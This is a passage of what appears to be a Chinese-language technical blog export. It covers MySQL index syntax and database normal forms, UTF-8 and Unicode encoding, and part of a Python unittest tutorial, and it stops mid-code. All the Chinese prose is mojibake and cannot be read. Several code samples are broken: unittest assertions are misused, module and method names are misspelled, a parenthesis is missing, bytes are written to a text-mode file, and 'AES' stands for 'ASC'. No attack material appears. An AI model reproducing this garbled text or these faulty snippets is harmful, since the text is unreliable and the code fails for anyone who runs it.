[åˆ«å](å±æ€§å<span class="number">1</span>[(é•¿åº¦)[,å±æ€§å<span class="number">2</span>(é•¿åº¦)...]] [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>])</span><br><span class="line">)[table_options];</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">    sex tinyint(<span class="number">1</span>),</span><br><span class="line">    fulltext index username(name)</span><br><span class="line">)engine<span class="operator">=</span>MyISAM;</span><br></pre></td></tr></table></figure>

<h3 id="åœ¨å·²å»ºç«‹çš„æ•°æ®è¡¨ä¸­åˆ›å»ºç´¢å¼•"><a href="#åœ¨å·²å»ºç«‹çš„æ•°æ®è¡¨ä¸­åˆ›å»ºç´¢å¼•" class="headerlink" title="åœ¨å·²å»ºç«‹çš„æ•°æ®è¡¨ä¸­åˆ›å»ºç´¢å¼•"></a>åœ¨å·²å»ºç«‹çš„æ•°æ®è¡¨ä¸­åˆ›å»ºç´¢å¼•</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> [<span class="keyword">unique</span> <span class="operator">|</span> fulltext] index index_name </span><br><span class="line"><span class="keyword">on</span> table_name(å±æ€§[(é•¿åº¦) [AES<span class="operator">|</span><span class="keyword">DESC</span>]])</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index username <span class="keyword">on</span> users(name);</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹è¡¨ç»“æ„çš„æ–¹å¼åˆ›å»ºç´¢å¼•ï¼Œå‚è§ã€ŠMySQLä»å…¥é—¨åˆ°ç²¾é€šã€‹ä¹‹åŸºæœ¬è¯­å¥ã€‚</p>
<h2 id="èŒƒå¼-Normal-Form"><a href="#èŒƒå¼-Normal-Form" class="headerlink" title="èŒƒå¼(Normal Form)"></a>èŒƒå¼(Normal Form)</h2><p>å…³ç³»å‹æ•°æ®åº“çš„è§„èŒƒåŒ–ç†è®ºä¸ºï¼šå…³ç³»æ•°æ®åº“ä¸­çš„æ¯ä¸€ä¸ªå…³ç³»éƒ½è¦æ»¡è¶³ä¸€å®šçš„è§„èŒƒã€‚æ ¹æ®æ»¡è¶³è§„èŒƒçš„æ¡ä»¶ä¸åŒï¼Œå¯ä»¥åˆ†ä¸º5ä¸ªç­‰çº§ï¼Œä¸€èˆ¬åªè¦æŠŠæ•°æ®åº“è§„èŒƒåˆ°ç¬¬ä¸‰ç­‰çº§å°±è¶³å¤Ÿäº†ã€‚</p>
<h3 id="ç¬¬ä¸€èŒƒå¼-1NF"><a href="#ç¬¬ä¸€èŒƒå¼-1NF" class="headerlink" title="ç¬¬ä¸€èŒƒå¼(1NF)"></a>ç¬¬ä¸€èŒƒå¼(1NF)</h3><p>ç¬¬ä¸€èŒƒå¼åŒ…æ‹¬ä¸‹åˆ—æŒ‡å¯¼åŸåˆ™ï¼š</p>
<ol>
<li>æ•°æ®ç»„ä¸­çš„æ¯ä¸ªå±æ€§åªå¯ä»¥åŒ…å«ä¸€ä¸ªå€¼</li>
<li>å…³ç³»ä¸­çš„æ¯ä¸ªæ•°ç»„å¿…é¡»åŒ…å«ç›¸åŒæ•°é‡çš„å€¼</li>
<li>å…³ç³»ä¸­çš„æ¯ä¸ªæ•°ç»„ä¸€å®šä¸èƒ½ç›¸åŒ</li>
</ol>
<p>åœ¨ä»»ä½•ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ä¸­ï¼Œç¬¬ä¸€èŒƒå¼æ˜¯å¯¹å…³ç³»æ¨¡å¼çš„åŸºæœ¬è¦æ±‚ï¼Œä¸æ»¡è¶³ç¬¬ä¸€èŒƒå¼çš„æ•°æ®åº“å°±ä¸æ˜¯å…³ç³»å‹æ•°æ®åº“ã€‚  </p>
<p><strong>å¦‚æœæ•°æ®è¡¨ä¸­çš„æ¯ä¸€ä¸ªåˆ—éƒ½æ˜¯ä¸å¯å†åˆ†å‰²çš„åŸºæœ¬æ•°æ®é¡¹ï¼Œå³åŒä¸€åˆ—ä¸­ä¸èƒ½æœ‰å¤šä¸ªå€¼ï¼Œé‚£ä¹ˆå°±ç§°æ­¤æ•°æ®è¡¨ç¬¦åˆç¬¬ä¸€èŒƒå¼</strong>ï¼Œç”±æ­¤å¯è§ç¬¬ä¸€èŒƒå¼å…·æœ‰ä¸å¯å†åˆ†å‰²çš„åŸå­ç‰¹æ€§ã€‚</p>
<h3 id="ç¬¬äºŒèŒƒå¼-2NF"><a href="#ç¬¬äºŒèŒƒå¼-2NF" class="headerlink" title="ç¬¬äºŒèŒƒå¼(2NF)"></a>ç¬¬äºŒèŒƒå¼(2NF)</h3><p>ç¬¬äºŒèŒƒå¼æ˜¯åœ¨ç¬¬ä¸€èŒƒå¼çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„ï¼Œå³æ»¡è¶³ç¬¬äºŒèŒƒå¼å¿…é¡»å…ˆæ»¡è¶³ç¬¬ä¸€èŒƒå¼ã€‚<strong>ç¬¬äºŒèŒƒå¼è¦æ±‚æ•°æ®åº“è¡¨ä¸­çš„æ¯ä¸ªå®ä½“ï¼ˆå³å„ä¸ªè®°å½•è¡Œï¼‰å¿…é¡»å¯ä»¥è¢«å”¯ä¸€åœ°åŒºåˆ†</strong>ã€‚ ä¸ºäº†å®ç°åŒºåˆ†å„è®°å½•è¡Œé€šå¸¸éœ€è¦ä¸ºè¡¨è®¾ç½®ä¸€ä¸ªâ€œåŒºåˆ†åˆ—â€ï¼Œç”¨ä»¥å­˜å‚¨å„ä¸ªå®ä½“çš„å”¯ä¸€æ ‡è¯†ã€‚è¿™ä¸ªå”¯ä¸€å±æ€§åˆ—è¢«ç§°ä¸º<strong>ä¸»å…³é”®å­—æˆ–ä¸»é”®ã€‚</strong></p>
<h3 id="ç¬¬ä¸‰èŒƒå¼-3NF"><a href="#ç¬¬ä¸‰èŒƒå¼-3NF" class="headerlink" title="ç¬¬ä¸‰èŒƒå¼(3NF)"></a>ç¬¬ä¸‰èŒƒå¼(3NF)</h3><p>ç¬¬ä¸‰èŒƒå¼æ˜¯åœ¨ç¬¬äºŒèŒƒå¼çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„ã€‚<strong>ç¬¬ä¸‰èŒƒå¼è¦æ±‚å…³ç³»è¡¨ä¸å­˜åœ¨éå…³é”®å­—åˆ—å¯¹ä»»æ„å€™é€‰å…³é”®å­—åˆ—çš„ä¼ é€’å‡½æ•°ä¾èµ–</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç¬¬ä¸‰èŒƒå¼è¦æ±‚ä¸€ä¸ªå…³ç³»è¡¨ä¸­ä¸åŒ…å«å·²åœ¨å…¶ä»–è¡¨ä¸­åŒ…å«çš„éä¸»å…³é”®å­—ä¿¡æ¯ã€‚<br>æ‰€è°“ä¼ é€’å‡½æ•°ä¾èµ–ï¼Œå°±æ˜¯æŒ‡å¦‚æœå­˜åœ¨å…³é”®å­—æ®µAå†³å®šéå…³é”®å­—æ®µBï¼Œè€Œéå…³é”®å­—æ®µBå†³å®šéå…³é”®å­—æ®µCï¼Œåˆ™ç§°éå…³é”®å­—æ®µCä¼ é€’å‡½æ•°ä¾èµ–ä¸å…³é”®å­—æ®µAã€‚å‚è€ƒä¸‹é¢çš„ä¾‹å­ï¼š  </p>
<blockquote>
<p>(å‘˜å·¥ç¼–ç ) â€”â€”&gt; (å†³å®š) (å‘˜å·¥å§“åã€å¹´é¾„ã€éƒ¨é—¨ç¼–ç ã€éƒ¨é—¨ç»ç†)  </p>
</blockquote>
<p>ä¸Šé¢è¿™ä¸ªå…³ç³»è¡¨æ˜¯ç¬¦åˆç¬¬äºŒèŒƒå¼çš„ï¼Œä½†æ˜¯ä¸ç¬¦åˆç¬¬ä¸‰èŒƒå¼ï¼Œå› ä¸ºè¯¥å…³ç³»è¡¨å†…éƒ¨éšå«ç€å¦‚ä¸‹å…³ç³»ï¼š</p>
<blockquote>
<p>(å‘˜å·¥ç¼–ç ) â€”â€”&gt; (å†³å®š) (éƒ¨é—¨ç¼–ç ) â€”â€”&gt; (å†³å®š) (éƒ¨é—¨ç»ç†)  </p>
</blockquote>
<p>ä¸Šé¢çš„å…³ç³»è¡¨çº¯çœŸéå…³é”®å­—æ®µâ€œéƒ¨é—¨ç»ç†â€å¯¹å…³é”®å­—æ®µâ€œå‘˜å·¥ç¼–ç â€çš„å‡½æ•°ä¼ é€’ä¾èµ–ï¼Œå¯¹äºä¸Šé¢è¿™ç§å…³ç³»ï¼Œå¯ä»¥æŠŠè¿™ä¸ªå…³ç³»è¡¨æ”¹ä¸ºå¦‚ä¸‹ä¸¤ä¸ªå…³ç³»è¡¨ï¼š  </p>
<blockquote>
<p>å‘˜å·¥ä¿¡æ¯è¡¨ï¼š(å‘˜å·¥ç¼–ç ï¼Œå‘˜å·¥å§“åï¼Œå¹´é¾„å¥½éƒ¨é—¨ç¼–ç )<br>éƒ¨é—¨ä¿¡æ¯è¡¨ï¼š(éƒ¨é—¨ç¼–ç å’Œéƒ¨é—¨ç»ç†)  </p>
</blockquote>
]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¹Ÿè°ˆ Unicode</title>
    <url>/2018/05/23/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<h2 id="ä¸åŒçš„ç¼–ç æ–¹å¼"><a href="#ä¸åŒçš„ç¼–ç æ–¹å¼" class="headerlink" title="ä¸åŒçš„ç¼–ç æ–¹å¼"></a>ä¸åŒçš„ç¼–ç æ–¹å¼</h2><p>ç”±äºè®¡ç®—æœºæ˜¯ç¾å›½äººå‘æ˜çš„ï¼Œæ‰€ä»¥æœ€æ—©çš„æ—¶å€™åªæ”¶å½•äº† 127 ä¸ªå­—ç¬¦ï¼ŒåŒ…æ‹¬é˜¿æ‹‰ä¼¯æ•°å­—ã€è‹±æ–‡å­—æ¯å¤§å°å†™å’Œä¸€äº›å¸¸ç”¨ç¬¦å·ï¼Œç§°ä¸º <code>ASCII</code>ã€‚åæ¥è®¡ç®—æœºè¶Šæ¥è¶Šæ™®åŠï¼Œ127 ä¸ªå­—ç¬¦æ˜¾ç„¶ä¸å¤Ÿã€‚äºæ˜¯å„å›½åˆåˆ¶å®šäº†è‡ªå·±å›½å®¶çš„å­—ç¬¦ç¼–ç ã€‚ä¸ºäº†é¿å…ä¸åŒå›½å®¶ä¹‹é—´é€šä¿¡å‡ºç°ä¹±ç çš„é—®é¢˜ï¼Œä¸€ç§ç»Ÿä¸€å­—ç¬¦é›† <code>Unicode</code> è¯ç”Ÿäº†ã€‚<code>ASCII</code> ç”¨ 1 ä¸ªå­—èŠ‚æ¥å‚¨å­˜ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ <code>Unicode</code> ç”¨ 4 ä¸ªå­—èŠ‚æ¥å‚¨å­˜å­—ç¬¦ã€‚ç†è®ºä¸Šæ‰€æœ‰çš„æ–‡å­—ã€ç¬¦å·éƒ½å¯ä»¥ç”¨ Unicode ç¼–ç è¡¨ç¤ºã€‚æ¢è¨€ä¹‹ï¼ŒUnicode æ˜¯ä¸€ç§è¡¨ç¤ºæ‰€æœ‰å­—ç¬¦çš„æ–¹å¼`ã€‚</p>
<p>æœ‰äº† Unicodeï¼Œå°±è§£å†³äº†ä»å­—ç¬¦åˆ°äºŒè¿›åˆ¶çš„è¡¨ç¤ºé—®é¢˜ã€‚æ¥ä¸‹æ¥é—®é¢˜å°±æ˜¯è®¡ç®—æœºå†…å¦‚ä½•ç¼–ç è¿™å¥—å­—ç¬¦é›†äº†ã€‚</p>
<p>æ‰€æœ‰ Unicode å­—ç¬¦é•¿åº¦éƒ½æ˜¯ 4 å­—èŠ‚ï¼Œç†è®ºä¸Šè®¡ç®—æœºåªéœ€è¦æ¯æ¬¡è¯»å– 4 ä¸ªå­—èŠ‚å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„ <code>UTF-32 ç¼–ç </code>ã€‚ç”±äºå¸¸ç”¨å­—ç¬¦æ•°ç›®ä¸åˆ° 65535 ä¸ªï¼Œç”¨ 2 ä¸ªå­—èŠ‚å°±èƒ½å®¹çº³ï¼Œé‚£å°±æ„å‘³ç€ 4 ä¸ªå­—èŠ‚ä¸­æœ‰ 2 ä¸ªæ˜¯ç»å¸¸è¢«æµªè´¹æ‰çš„ã€‚æ‰€è°“æµªè´¹å°±æ˜¯çŠ¯ç½ªï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œç³»ç»Ÿå¯ä»¥è€è€å®å®æ¯æ¬¡è¯»å– 2 å­—èŠ‚ï¼Œé‡åˆ°ç‰¹æ®Šç¬¦å·æ—¶å†å¾€åå¤šè¯» 2 å­—èŠ‚ å°±å¯ä»¥äº†ã€‚è¿™å°±æ˜¯ Java é»˜è®¤çš„ <code>UTF-16 ç¼–ç </code>ã€‚å¯æ˜¯é—®é¢˜ä¾ç„¶æ²¡æœ‰å®Œå…¨è§£å†³ï¼Œè‹±è¯­æ˜¯æœ€å¸¸ç”¨çš„è¯­è¨€ï¼Œå‰é¢è¯´è¿‡ï¼Œåªéœ€è¦ 1 ä¸ªå­—èŠ‚å°±å¯ä»¥è¡¨ç¤ºè‹±æ–‡å­—æ¯äº†ï¼ŒUTF-16 æŠŠæ¯ä¸ªå­—æ¯ä¹ŸæŒ‰ç…§ 2 å­—èŠ‚ çš„æ–¹å¼ç¼–ç ï¼Œè¿™æ— ç–‘è¿˜æ˜¯æµªè´¹äº†å¾ˆå¤šå­˜å‚¨ç©ºé—´ã€‚å¦ä¸€ç§ç¼–ç æ–¹å¼ <code>UTF-8 ç¼–ç </code> åˆ™è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚UTF-8 ç¼–ç é€šå¸¸åªå  1 å­—èŠ‚ï¼Œä½†æ˜¯ä¼šç”¨å‡ ä½å†—ä½™ä¿¡æ¯å‘Šè¯‰ç³»ç»Ÿï¼Œå½“å‰å­—ç¬¦æœ‰æ²¡æœ‰ç»“æŸï¼Œè¿˜éœ€è¦ç»§ç»­å¾€ä¸‹è¯»ä¸‹ä¸€ä¸ªå­—èŠ‚ã€‚UTF-8 ç¼–ç å¯¹è‹±æ–‡åªä¼šå ç”¨ 1 å­—èŠ‚ çš„ç©ºé—´ï¼Œè€Œä¸€äº›ç‰¹æ®Šå­—ç¬¦å¦‚ä¸­æ–‡ï¼Œåˆ™ä¼šæ™ºèƒ½åœ°å¤šå ç”¨ä¸€ç‚¹ç©ºé—´è¿›è¡Œå­˜å‚¨ï¼Œè¿™æ ·å°±å¤§å¤§èŠ‚çº¦äº†ç©ºé—´ï¼Œç‰¹åˆ«é€‚åˆç”¨äºæœ¬åœ°å­˜å‚¨å’Œç½‘ç»œä¼ è¾“ã€‚åœ¨è®¡ç®—æœºå†…å­˜ä¸­ï¼Œç»Ÿä¸€ä½¿ç”¨ Unicode å­—ç¬¦é›†ï¼Œè€Œåœ¨ç½‘ç»œä¼ è¾“å’Œç¡¬ç›˜ä¿å­˜æ—¶ï¼Œæ¨èä½¿ç”¨ UTF-8 ä½œä¸ºç¼–ç æ–¹å¼ã€‚</p>
<p>å ç”¨ä¸åŒå­—èŠ‚æ•°çš„ UTF-8 ç¼–ç è¡¨ç¤ºå½¢å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0xxxxxxx    // 0-127ï¼ŒASCII å­—ç¬¦</span><br><span class="line">110xxxxx 10xxxxxx   // 128-2047</span><br><span class="line">1110xxxx 10xxxxxx 10xxxxxx  // 2048-65535</span><br><span class="line">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx // 65536-0x10ffff</span><br></pre></td></tr></table></figure>

<p>é€šå¸¸æŒ‰ UTF-8 ç¼–ç çš„ä¸­æ–‡å­—ç¬¦å  3 å­—èŠ‚ã€‚è¿™ç§å˜é•¿ç¼–ç å¯¼è‡´å­—ç¬¦ä¸²æ— æ³•æŒ‰å­—èŠ‚ä¸‹æ ‡ç›´æ¥è¯»å–ä¸€ä¸ªå­—ç¬¦ï¼Œä½†ç”±äºå…¶ä¸ ASCII å®Œå…¨å…¼å®¹ã€éå¸¸èŠ‚çº¦å­˜å‚¨ç©ºé—´ã€ç®—æ³•é«˜æ•ˆç­‰ç‰¹æ€§ï¼Œåœ¨å®é™…ä¸­è·å¾—äº†å¹¿æ³›çš„åº”ç”¨ã€‚ä»¥ä¸‹ 3 ç§å­—ç¬¦ä¸²å¸¸é‡å‡è¡¨ç¤ºé•¿åº¦ä¸º 6 å­—èŠ‚çš„ç›¸åŒä¸²ï¼š</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;ä¸–ç•Œ&quot;</span>  <span class="comment">// ä¸­æ–‡å­—ç¬¦</span></span><br><span class="line"><span class="string">&quot;\xe4\xb8\x96\xe7\x95\x8c&quot;</span>  <span class="comment">// UTF-8</span></span><br><span class="line"><span class="string">&quot;\u4e16\u754c&quot;</span>  <span class="comment">// Unicode</span></span><br></pre></td></tr></table></figure>

<h2 id="ç¼–ç ä¸è§£ç "><a href="#ç¼–ç ä¸è§£ç " class="headerlink" title="ç¼–ç ä¸è§£ç "></a>ç¼–ç ä¸è§£ç </h2><p>åœ¨ python3ä¸­ï¼Œå­—ç¬¦é»˜è®¤æŒ‰ Unicode ç¼–ç ï¼Œè€Œåœ¨è¿›è¡Œç½‘ç»œä¼ è¾“å’Œç¡¬ç›˜ä¿å­˜æ—¶ï¼Œå¸¸å¸¸å°† Unicode å­—ç¬¦æŒ‰ UTF-8 çš„æ–¹å¼ç¼–ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ä»ç½‘ç»œä¸Šè·å–æ•°æ®æ—¶ï¼Œå¸¸å¸¸ä¹Ÿæ˜¯è·å–åˆ°ä»¥ UTF-8 å½¢å¼ç¼–ç çš„å­—èŠ‚ï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œéœ€è¦è§£ç æˆæ™®é€šçš„ Unicodeï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(b.decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># è¾“å‡ºï¼š&#x27;ä¸­æ–‡&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>ä¸ºäº†é¿å…ä¹±ç ï¼Œåº”è¯¥å§‹ç»ˆåšæŒä»¥ UTF-8 çš„å½¢å¼è¿›è¡Œå­—ç¬¦å’Œå­—èŠ‚ä¹‹é—´çš„è½¬æ¢ã€‚</strong></p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>ç¼–ç </tag>
      </tags>
  </entry>
  <entry>
    <title>unittestç®€ä»‹</title>
    <url>/2018/05/23/unittest%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>æœ‰ä¸ªè¯å«TDD(Tset Driven Development)ï¼Œæµ‹è¯•é©±åŠ¨å¼€å‘ã€‚ä¸€ä¸ªå¥½çš„å¼€å‘äººå‘˜ä¸ä»…è¦æ‡‚å¼€å‘ï¼Œè¿˜è¦æ‡‚å¾—ä¸€å®šçš„æµ‹è¯•æŠ€å·§ã€‚pythonè‡ªå¸¦äº†å¾ˆå¤šçš„æµ‹è¯•åº“ï¼Œæ¯”å¦‚unittestï¼Œcoverageâ€¦.ä»‹ç»ä¸€ä¸‹unittestçš„ä½¿ç”¨ã€‚</p>
<h1 id="unittestså››ä¸ªé‡è¦çš„æ¦‚å¿µ"><a href="#unittestså››ä¸ªé‡è¦çš„æ¦‚å¿µ" class="headerlink" title="unittestså››ä¸ªé‡è¦çš„æ¦‚å¿µ"></a>unittestså››ä¸ªé‡è¦çš„æ¦‚å¿µ</h1><p>unittestæœ‰å››ä¸ªé‡è¦çš„é¢å‘å¯¹è±¡æ¦‚å¿µï¼š</p>
<ol>
<li>test fixtureã€‚è¿™ä¸ªæ¦‚å¿µä¸»è¦å¤„ç†æµ‹è¯•ç¯å¢ƒçš„æ­å»ºå’Œæ¸…ç†ã€‚å¾ˆå¤šæ—¶å€™æˆ‘ä»¬åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™éœ€è¦æ­å»ºåˆé€‚çš„ç¯å¢ƒï¼Œä¾‹å¦‚åˆ›å»ºç›®å½•ã€åˆ›å»ºæ•°æ®åº“ç­‰ï¼Œè€Œåœ¨æµ‹è¯•å®Œæ¯•åè¿™äº›ç¯å¢ƒåˆä¸å†éœ€è¦äº†ã€‚test fixturnå¯ä»¥å¸®æˆ‘ä»¬å¾ˆå¥½çš„å¤„ç†è¿™äº›äº‹æƒ…ã€‚</li>
<li>test caseã€‚ æ—¢ç„¶è¦è¿›è¡Œæµ‹è¯•ï¼Œæµ‹è¯•ç”¨ä¾‹å½“ç„¶æ˜¯æœ€é‡è¦çš„ã€‚æ¯ä¸€é¡¹æµ‹è¯•å†…å®¹éƒ½æ˜¯ä¸€ä¸ªtest caseã€‚</li>
<li>test suiteã€‚æˆ‘ä»¬å½“ç„¶ä¸å¸Œæœ›åªèƒ½ä¸€é¡¹é¡¹çš„è¿›è¡Œæµ‹è¯•ï¼Œæœ€å¥½æ˜¯å°†è¦æµ‹è¯•çš„é¡¹ç›®æ”¾åœ¨ä¸€èµ·ã€‚test suiteç›¸å½“äºtest caseçš„é›†åˆï¼Œå½“ç„¶test suiteä¹Ÿèƒ½åµŒå¥—åœ¨test suiteä¸­ã€‚</li>
<li>test runnerã€‚é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªæ¦‚å¿µè´Ÿè´£æ‰§è¡Œæµ‹è¯•å¹¶æ§åˆ¶ç»“æœè¾“å‡ºã€‚</li>
</ol>
<h1 id="åˆ›å»ºtestcase"><a href="#åˆ›å»ºtestcase" class="headerlink" title="åˆ›å»ºtestcase"></a>åˆ›å»ºtestcase</h1><p>unittestæä¾›äº†TastCaseç±»ï¼Œè¦åˆ›å»ºä¸€ä¸ªtestcaseåªéœ€è¦ç»§æ‰¿è¿™ä¸ªçˆ¶ç±»å°±å¥½äº†ã€‚</p>
<p>å…ˆåœ¨<code>mathfunc.py</code>ç¼–å†™ä¸‰ä¸ªå‡½æ•°ç”¨äºæµ‹è¯•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minus</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x - y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>test_math.py</code>ä¸­åˆ›å»ºæµ‹è¯•ç”¨ä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unittest <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestMath</span>(<span class="params">TestCase</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_add</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;æµ‹è¯•addå‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">        self.assertTrue(<span class="number">1</span>+<span class="number">2</span>, add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_minus</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;æµ‹è¯•minuså‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">        self.assertEqual(<span class="number">2</span>-<span class="number">1</span>, minus(<span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_string</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;æµ‹è¯•stringå‡½æ•°&quot;&quot;&quot;</span></span><br><span class="line">        self.assertIn(<span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> string(<span class="string">&#x27;hello&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>è¿™å°±åˆ›å»ºäº†ä¸€ä¸ªtestcaseï¼ŒåŒ…å«ä¸‰ä¸ªæµ‹è¯•ã€‚<strong>testcaseä¸­æ‰€æœ‰çš„æµ‹è¯•å¿…é¡»ä»¥<code>test</code>å¼€å¤´</strong>ã€‚<code>self.assert*()</code>æ˜¯ç”±TestCaseæä¾›çš„æµ‹è¯•å‡½æ•°ã€‚æ¯ä¸€ä¸ªæµ‹è¯•é‡Œçš„æ–‡æ¡£ä¼šåœ¨è¾“å‡ºæµ‹è¯•æŠ¥å‘Šæ—¶æ˜¾ç¤ºã€‚ä¸ç”¨pythonå†…ç½®çš„assert()æ˜¯å› ä¸ºuniitteståœ¨é‡åˆ°<code>self.assert*()</code>å‘ç”Ÿé”™è¯¯æ—¶ä¼šæŠŠè¿™ä¸ªæµ‹è¯•æ ‡è®°ä¸ºfailureï¼Œç„¶åç»§ç»­æ‰§è¡Œå…¶ä»–æµ‹è¯•ã€‚</p>
<h1 id="åˆ›å»ºtestsuite"><a href="#åˆ›å»ºtestsuite" class="headerlink" title="åˆ›å»ºtestsuite"></a>åˆ›å»ºtestsuite</h1><p>æœ‰äº†testcaseï¼Œè‡ªç„¶æƒ³æŠŠå®ƒåŠ å…¥åˆ°suiteä¸­ã€‚unittestæä¾›äº†<code>TestSuite</code>ç±»æ¥è¡¨ç¤ºä¸€ä¸ªsuiteã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒunittestæŒ‰æµ‹è¯•å‡½æ•°çš„å‡½æ•°åè¿›è¡Œæ’åºï¼Œç„¶åæŒ‰è¿™ä¸ªæ’åºæ‰§è¡Œæµ‹è¯•ã€‚å¦‚æœæˆ‘ä»¬æƒ³æ§åˆ¶æµ‹è¯•æ‰§è¡Œé¡ºåºï¼Œå°±è¦åœ¨å‘suiteæ·»åŠ caseæ—¶åšç‚¹æ–‡ç« ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mathfunc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> unittest</span><br><span class="line"></span><br><span class="line">suite = unittest.TestSuite()</span><br><span class="line"><span class="comment"># ä¼ å…¥åˆ—è¡¨ï¼Œè¿™æ ·å°±ä¼šæŒ‰ç…§å…ƒç´ é¡ºåºæ‰§è¡Œæµ‹è¯•</span></span><br><span class="line">suite.addTests([TestMath(<span class="string">&#x27;test_add&#x27;</span>), TestMath(<span class="string">&#x27;test_minus&#x27;</span>), TestMath(<span class="string">&#x27;test_string&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure>
<p>è¿˜å¯ä»¥é€šè¿‡unittestæä¾›çš„TestLoaderç±»æ¥æ·»åŠ testcaseï¼Œ<strong>TestLoaderä¼šè¿”å›ä¸€ä¸ªsuite</strong>ã€‚ä¸è¿‡<strong>TestLoaderæ— æ³•ä¿è¯æŒ‰ç…§é¡ºåºæ‰§è¡Œæµ‹è¯•</strong>ã€‚TestLoaderç±»æä¾›äº†ä¸€ä¸‹å¸¸ç”¨æ–¹æ³•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> test_math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‰ç§æ–¹æ³•éƒ½å¯ä»¥</span></span><br><span class="line">suite.addTests(unittest.TestLoader().loadTestsFromName(<span class="string">&#x27;test_math.TestMath&#x27;</span>))</span><br><span class="line">suite.addTests(unitest.TestLoader().loadTestsFromNanes([<span class="string">&#x27;test_math.TestMath&#x27;</span>])</span><br><span class="line">suite.addTests(unitest.TestLoader().loadTestsFromTestCase(TestMath))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 